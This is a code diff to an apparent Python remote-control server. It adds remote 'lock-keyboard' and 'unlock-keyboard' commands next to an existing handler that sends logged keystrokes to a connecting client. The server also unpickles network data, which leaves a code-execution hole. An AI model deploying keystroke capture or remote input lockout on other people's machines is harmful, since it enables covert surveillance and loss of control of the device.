@@ -2,7 +2,7 @@ import os
 from pickle import loads, dumps
 import socket
 import threading
-import utils, process, keystroke, registry, mac
+import utils, process, keystroke, registry, mac, lock_keyboard
 
 HOST = socket.gethostname()
 PORT = 10000
@@ -144,6 +144,26 @@ def connection_handler(connection, address):
             try:
                 ok = True
                 data = keystroke_detector.get_keys()
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
+
+        elif header == 'lock-keyboard':
+            try:
+                lock_keyboard.enable()
+                ok = True
+                data = None
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
+
+        elif header == 'unlock-keyboard':
+            try:
+                lock_keyboard.disable()
+                ok = True
+                data = None
             except:
                 ok = False
                 data = None
